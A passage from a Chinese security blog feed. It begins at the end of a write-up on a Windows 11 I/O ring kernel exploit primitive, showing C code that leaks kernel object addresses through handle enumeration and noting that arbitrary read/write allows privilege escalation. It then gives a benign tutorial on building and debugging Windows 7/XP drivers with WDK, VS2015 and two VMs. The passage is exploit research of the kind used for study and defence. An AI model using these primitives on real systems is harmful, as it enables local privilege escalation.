(<span class="hljs-literal">NULL</span> != pMcBufferEntry)<br>    &#123;<br>        VirtualFree(pMcBufferEntry, <span class="hljs-keyword">sizeof</span>(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="内核句柄查找"><a href="#内核句柄查找" class="headerlink" title="内核句柄查找"></a>内核句柄查找</h4><ul><li>获取内核指向_IORING_OBJECT的结构体指针呢，这里需要用到常用的句柄查找技术</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 定义一个PSYSTEM<span class="hljs-emphasis">_HANDLE_</span>INFORMATION结构体指针pHandleInfo，用于存储从系统中查询到的句柄信息。<br><span class="hljs-bullet">2.</span> 使用NtQuerySystemInformation函数查询系统句柄信息，如果查询结果长度不足，则重新分配内存空间并继续查询，直到获取到足够的句柄信息为止。<br><span class="hljs-bullet">3.</span> 遍历句柄信息，找到指定进程ID和句柄值所对应的句柄信息，从而获取到内核对象地址，并将其存储到ppObjAddr指针所指向的内存中。<br><span class="hljs-bullet">4.</span> 如果找到了对应的句柄信息，则返回0表示操作成功；否则返回其他错误代码。<br><span class="hljs-bullet">5.</span> 释放之前分配的内存空间。<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs sas">int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)<br>&#123;<br>    int ret = -1;<br>    PSYSTEM_HANDLE_INFORMATION pHandleInfo = <span class="hljs-keyword">NULL</span>;<br>    ULONG ulBytes = 0;<br>    NTSTATUS ntStatus = STATUS_SUCCESS;<br> <br>    <span class="hljs-keyword">while</span> ((ntStatus = NtQuerySystemInformatio<span class="hljs-meta">n</span>(SystemHandleInformation, pHandleInfo, ulBytes, <span class="hljs-variable">&amp;ulBytes</span>)) == STATUS_INFO_LENGTH_MISMATCH)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pHandleInfo != <span class="hljs-keyword">NULL</span>)<br>        &#123;<br>            pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 <span class="hljs-comment">* ulBytes);</span><br>        &#125;<br> <br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 <span class="hljs-comment">* ulBytes);</span><br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (ntStatus != STATUS_SUCCESS)<br>    &#123;<br>        ret = ntStatus;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    for (ULONG i = 0; i &lt; pHandleInfo-&gt;NumberOfHandles; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((pHandleInfo-&gt;Handles[i].UniqueProcessId == ulPid) <span class="hljs-variable">&amp;&amp;</span> (pHandleInfo-&gt;Handles[i].HandleValue == handle))<br>        &#123;<br>            <span class="hljs-comment">*ppObjAddr = pHandleInfo-&gt;Handles[i].Object;</span><br>            ret = 0;<br>            break;<br>        &#125;<br>    &#125;<br> <br>done:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">NULL</span> != pHandleInfo)<br>    &#123;<br>        HeapFree(GetProcessHeap, 0, pHandleInfo);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>拥有了任意地址读写,就可以进行提权了。</li></ul><h2 id="五-参考"><a href="#五-参考" class="headerlink" title="五.参考"></a>五.参考</h2><p><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/</a></p><p><a href="https://bbs.kanxue.com/thread-277016.htm">https://bbs.kanxue.com/thread-277016.htm</a></p>]]></content>
    
    
    <categories>
      
      <category>window_security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability_analysis</tag>
      
      <tag>Windows_cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows_xp_win7驱动编译调试环境搭建</title>
    <link href="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Windows-xp-win7-驱动编译与双虚拟机调试环境搭建"><a href="#Windows-xp-win7-驱动编译与双虚拟机调试环境搭建" class="headerlink" title="Windows_xp_win7-驱动编译与双虚拟机调试环境搭建"></a>Windows_xp_win7-驱动编译与双虚拟机调试环境搭建</h1><h2 id="一-简述"><a href="#一-简述" class="headerlink" title="一.简述"></a>一.简述</h2><ul><li>因最近需要编写一些xp与win7上的驱动程序，但是网上搜索环境配置要不就很老旧，要不很繁琐，最好还是能双虚拟机调试，在网上没有找到能完全满足需求的，就整合网上的一些资源编写此文档。</li><li>主要内容为使用vmware 双win7虚拟机调试、win7安装vs2015、使用驱动模板编译win7与xp驱动</li></ul><h2 id="二-环境介绍"><a href="#二-环境介绍" class="headerlink" title="二.环境介绍"></a>二.环境介绍</h2><table><thead><tr><th>应用名称</th><th>版本</th><th>备注</th></tr></thead><tbody><tr><td>windows7 x64 调试机</td><td>windows7 x64 sp1</td><td>cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso</td></tr><tr><td>windows7 x64 被调试机</td><td>windows7 x64 sp1</td><td>cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso</td></tr><tr><td>WDK 7600</td><td>7600.16385.1</td><td><a href="https://www.microsoft.com/en-us/download/details.aspx?id=11800">https://www.microsoft.com/en-us/download/details.aspx?id=11800</a></td></tr><tr><td>VS 2015</td><td>Visual Studio <em>2015</em> Community</td><td></td></tr><tr><td>ie 11</td><td>ie 11</td><td><a href="https://support.microsoft.com/zh-cn/windows/%E4%B8%8B%E8%BD%BD-internet-explorer-11-%E8%84%B1%E6%9C%BA%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-99d492a1-3a62-077b-c476-cf028aff9a7f"><strong>https://support.microsoft.com/zh-cn/windows/%E4%B8%8B%E8%BD%BD-internet-explorer-11-%E8%84%B1%E6%9C%BA%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-99d492a1-3a62-077b-c476-cf028aff9a7f</strong></a></td></tr><tr><td>wingdb</td><td>6.12</td><td>调试工具</td></tr><tr><td>vmware workstation</td><td>vmware workstation 17 pro</td><td></td></tr><tr><td>SRVINSTW.EXE</td><td>SRVINSTW.EXE</td><td>安装驱动程序</td></tr><tr><td>dbgview64.exe</td><td>dbgview64.exe</td><td>查看驱动打印</td></tr><tr><td>vs2013驱动开发模板</td><td>驱动配置模板</td><td><a href="https://bbs.kanxue.com/thread-188471.htm">https://bbs.kanxue.com/thread-188471.htm</a></td></tr><tr><td>Everything</td><td>Everything-1.4.1.935.x86-Setup</td><td></td></tr><tr><td>64Signer</td><td>64Signer</td><td>签名工具</td></tr></tbody></table><ul><li><p>win7 虚拟机不能安装vm tools</p><ul><li><a href="https://catalog.update.microsoft.com/Search.aspx?q=kb4474419">https://catalog.update.microsoft.com/Search.aspx?q=kb4474419</a></li></ul></li><li><p>vs2015支持模板导出，也可以选择制作自己的模板</p></li></ul><h2 id="三-安装测试wdk7600"><a href="#三-安装测试wdk7600" class="headerlink" title="三.安装测试wdk7600"></a>三.安装测试wdk7600</h2><h3 id="3-1-安装wdk7600"><a href="#3-1-安装wdk7600" class="headerlink" title="3.1.安装wdk7600"></a>3.1.安装wdk7600</h3><ul><li>下载<code>WDK 7600</code>并解压执行</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215103102.png" class="" title="png"><ul><li>勾选全部选项并点击ok</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215131580.png" class="" title="png"><ul><li>选择路径，我这直接点击ok</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215218962.png" class="" title="png"><ul><li>点击<code>Finish</code>完成安装</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215604598.png" class="" title="png"><h3 id="3-2-使用wdk7600编译驱动程序"><a href="#3-2-使用wdk7600编译驱动程序" class="headerlink" title="3.2.使用wdk7600编译驱动程序"></a>3.2.使用wdk7600编译驱动程序</h3><h4 id="3-2-1-驱动代码"><a href="#3-2-1-驱动代码" class="headerlink" title="3.2.1.驱动代码"></a>3.2.1.驱动代码</h4><ul><li><p>创建<code>first</code>目录，在此目录中创建三个文件</p></li><li><p>first.c</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><br><span class="hljs-function">VOID <span class="hljs-title">DriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span></span>&#123;<br>     <span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our driver is unloading\r\n&quot;</span>);<br> &#125;<br> <span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)</span></span>&#123;<br>     <br>     <span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our hello my salary\r\n&quot;</span>);<br>     <br>     driver-&gt;DriverUnload=DriverUnload;<br>     <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>makefile</li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">!IF <span class="hljs-number">0</span><br>Module Name:<br>makefile .<br>Notes:<br>DO NOT EDIT THIS FILE!!!<br>!ENDIF<br>!INCLUDE $(NTMAKEENV)\makefile.def<br></code></pre></td></tr></table></figure><ul><li>SOURCES</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">TARGETNAME</span><span class="hljs-operator">=</span>first<br><span class="hljs-attribute">TARGETTYPE</span><span class="hljs-operator">=</span>DRIVER<br><span class="hljs-attribute">SOURCES</span><span class="hljs-operator">=</span>first.c<br></code></pre></td></tr></table></figure><ul><li><p>TARGETNAME表示名字，编译出来之后模块的名字first.sys</p></li><li><p>SOURCES表示要编译的.c文件</p></li><li><ul><li>不要加入.h文件，.h是被包含在.c文件中编译的</li></ul></li></ul><h4 id="3-2-2-编译"><a href="#3-2-2-编译" class="headerlink" title="3.2.2.编译"></a>3.2.2.编译</h4><ul><li>开始菜单中，选择 所有程序 ,然后选择 <code>Windows Driver Kits</code>  -&gt; <code>WDK版本</code> -&gt;   <code>Build Environments</code>  -&gt;  <code>Windows 7</code>  -&gt;   <code>x64 Checked Build Environment</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225220248934.png" class="" title="png"><ul><li>进入 first 目录执行 build 命令</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225220640605.png" class="" title="png"><ul><li>编译结束， first.sys 出现在 <code>C:\Users\test\Desktop\first\objchk_win7_amd64\amd64</code> 目录下</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225220717940.png" class="" title="png"><h3 id="3-3-测试驱动程序"><a href="#3-3-测试驱动程序" class="headerlink" title="3.3.测试驱动程序"></a>3.3.测试驱动程序</h3><h4 id="3-3-1-安装驱动程序"><a href="#3-3-1-安装驱动程序" class="headerlink" title="3.3.1.安装驱动程序"></a>3.3.1.安装驱动程序</h4><ul><li>在一台新安装的<code>win7 x64 sp1</code>虚拟机上执行，在开机时按下<code>f8</code>，禁用驱动签名，将生成的<code>first.sys</code>拷贝到此虚拟机</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221105405.png" class="" title="png"><ul><li>使用管理员权限打开<code>SRVINSTW.EXE</code>，<code>安装服务</code>点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221449033.png" class="" title="png"><ul><li><code>本地机器</code>点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221533209.png" class="" title="png"><ul><li>服务名称填写<code>first</code>然后点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221603524.png" class="" title="png"><ul><li>根据<code>first.sys</code>所在路径填写，文件位置</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221656680.png" class="" title="png"><ul><li>选择<code>设备驱动</code>，点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221749610.png" class="" title="png"><ul><li>默认点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221802026.png" class="" title="png"><ul><li>选择<code>手动</code>，点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221823143.png" class="" title="png"><ul><li>点击<code>完成</code>，弹出服务成功安装</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221857378.png" class="" title="png"><h4 id="3-3-2-执行驱动程序"><a href="#3-3-2-执行驱动程序" class="headerlink" title="3.3.2.执行驱动程序"></a>3.3.2.执行驱动程序</h4><ul><li>管理器权限执行<code>dbgview64.exe</code>，在菜单栏点击<code>capture</code>，然后全部勾选</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225222132047.png" class="" title="png"><ul><li>管理员启动<code>cmd</code>，执行<code>net start first</code>,可以看到<code>dbgview64.exe</code>,有打印输出与，上述驱动代码相同</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225222324785.png" class="" title="png"><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">net <span class="hljs-built_in">start</span> <span class="hljs-keyword">first</span> \\启动驱动<br>net <span class="hljs-built_in">stop</span> <span class="hljs-keyword">first</span>\\停止驱动<br>sc <span class="hljs-built_in">delete</span> <span class="hljs-keyword">first</span> \\卸载驱动<br></code></pre></td></tr></table></figure><ul><li>如上面所示<code>wdk7600</code>安装成功</li></ul><h2 id="四-安装vs2015"><a href="#四-安装vs2015" class="headerlink" title="四.安装vs2015"></a>四.安装vs2015</h2><h3 id="4-1-安装IE11"><a href="#4-1-安装IE11" class="headerlink" title="4.1.安装IE11"></a>4.1.安装IE11</h3><ul><li>因为vs2015要求安装<code>ie 10</code>以上版本，这里安装<code>ie11</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225223552141.png" class="" title="png"><ul><li><p>可能有下列情况，先尝试直接安装，直接安装不成功或者看报错信息在选择执行情况1或情况2</p></li><li><p>情况1：有可能安装<code>IE11</code>需要补丁，补丁链接如下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">32</span>位<br><br><span class="hljs-symbol">http:</span>//www.microsoft.com/<span class="hljs-built_in">zh</span>-cn/download/internet-explorer.aspx<br><br><span class="hljs-number">64</span>位<br><br><span class="hljs-symbol">http:</span>//www.microsoft.com/<span class="hljs-built_in">zh</span>-cn/download/details.aspx?id=<span class="hljs-number">45154</span><br></code></pre></td></tr></table></figure></li><li><p>情况2安装证书：</p></li><li><p>在win10系统上Windows键+R 弹出<code>运行</code>对话框，输入<code>certmgr.msc</code>，打开Windows的证书管理器</p></li><li><p>导出如下证书安装在win7系统上</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.Microsoft</span> Root Certificate Authority <span class="hljs-number">2010</span>；<br><br><span class="hljs-number">2</span><span class="hljs-selector-class">.Microsoft</span> Root Certificate Authority <span class="hljs-number">2011</span>；<br><br><span class="hljs-number">3</span><span class="hljs-selector-class">.COMODO</span> RSA Certification Authority；<br><br></code></pre></td></tr></table></figure><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225224355149.png" class="" title="png"><ul><li>将上面三个证书拷贝到<code>win7</code>系统然后安装上去</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225224604565.png" class="" title="png"><h3 id="4-2-安装vs2015"><a href="#4-2-安装vs2015" class="headerlink" title="4.2.安装vs2015"></a>4.2.安装vs2015</h3><ul><li>运行<code>vs2015</code>安装程序，这里我选择自定义</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230137520.png" class="" title="png"><ul><li>只选择<code>c++</code>然后点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230849872.png" class="" title="png"><ul><li>点击安装</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230904010.png" class="" title="png"><ul><li>等待安装成功即可</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230924485.png" class="" title="png"><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226012901806.png" class="" title="png"><h2 id="五-配置vs2015编译驱动"><a href="#五-配置vs2015编译驱动" class="headerlink" title="五.配置vs2015编译驱动"></a>五.配置vs2015编译驱动</h2><ul><li>这里是使用模板的方式进行的配置编译驱动，这里直接使用网上大佬放出来的模板，也可以自己进行配置然后导出是一样的，但是会很耗费时间与精力</li></ul><h3 id="5-1-配置环境变量"><a href="#5-1-配置环境变量" class="headerlink" title="5.1.配置环境变量"></a>5.1.配置环境变量</h3><ul><li>新建<code>WDKPATH</code>,并添加wdk路径</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226013221782.png" class="" title="png"><h3 id="5-2-设置模板"><a href="#5-2-设置模板" class="headerlink" title="5.2.设置模板"></a>5.2.设置模板</h3><ul><li>安装<code>Everything</code>,搜索<code>ProjectTemplates</code>目录</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226013706476.png" class="" title="png"><ul><li>进入<code>ProjectTemplates</code>,将下载好的模板拷贝过去，然后重启系统</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226013858698.png" class="" title="png"><h3 id="5-3-编译驱动程序"><a href="#5-3-编译驱动程序" class="headerlink" title="5.3.编译驱动程序"></a>5.3.编译驱动程序</h3><ul><li>打开<code>vs2015</code>创建新项目，点击<code>c++</code>，可以发现出现了<code>Windows Driver1</code></li><li>创建<code>Windows Driver1</code>项目，名称填写<code>first2</code>,将一开始编写的驱动代码拷贝过去</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226014549378.png" class="" title="png"><ul><li>如下图所示使用此项目可以编译多种系统的驱动,<code>Checked</code>为调试，<code>free</code>为re版</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226014635805.png" class="" title="png"><ul><li>并且可以选择<code>x64</code>和<code>x86</code>，需要注意无法编译<code>xp</code>下的<code>x64</code>的驱动程序</li><li>需要注意这是使用<code>vs2013</code>的模板，需要将项目属性改为<code>v140</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015050873.png" class="" title="png"><ul><li><code>生成</code>-&gt;<code>重新生成解决方案</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015146035.png" class="" title="png"><h3 id="5-4-更改模板"><a href="#5-4-更改模板" class="headerlink" title="5.4.更改模板"></a>5.4.更改模板</h3><ul><li>1.更改上面的<code>平台工具集</code></li><li>2.在属性面板，可以看到<code>全程序优化</code>（无全程序优化）</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015445158.png" class="" title="png"><ul><li>3.更改到<code>re</code>版，可以看到<code>使用链接时间代码生成</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015510577.png" class="" title="png"><ul><li>在属性页，点击<code>链接器</code>-&gt;<code>优化</code>-&gt;<code>使用快速链接时间代码生成 (/LTCG:incremental)</code>,这样编译会报错</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015805570.png" class="" title="png"><ul><li>需要改成<code>使用链接时间代码生成 (/LTCG)</code>,即可完成编译</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015838787.png" class="" title="png"><ul><li>自己也可以制作成模板，就不需要每次编写驱动，进行配置vs</li></ul><h2 id="六-双虚拟机调试驱动"><a href="#六-双虚拟机调试驱动" class="headerlink" title="六.双虚拟机调试驱动"></a>六.双虚拟机调试驱动</h2><ul><li>本文中的调试机与被调试机都为<code>win7 x64 sp1</code></li></ul><h3 id="6-1-配置调试机"><a href="#6-1-配置调试机" class="headerlink" title="6.1.配置调试机"></a>6.1.配置调试机</h3><ul><li>该端是<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&from=20065">服务器</a> ，另一端是虚拟机</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185952446.png" class="" title="png"><ul><li>打开windbg左上角的 File然后点击Kernel Debug 然后再点击 COM ，设置如下图所示 ，然后点击确定</li><li>安装的wdk7600中就带有<code>windbg</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226190145008.png" class="" title="png"><ul><li>选择com，然后点击确认，设置如下图所示</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226190155635.png" class="" title="png"><ul><li>点击确定后的画面如下图所示，然后重启Win 7 在 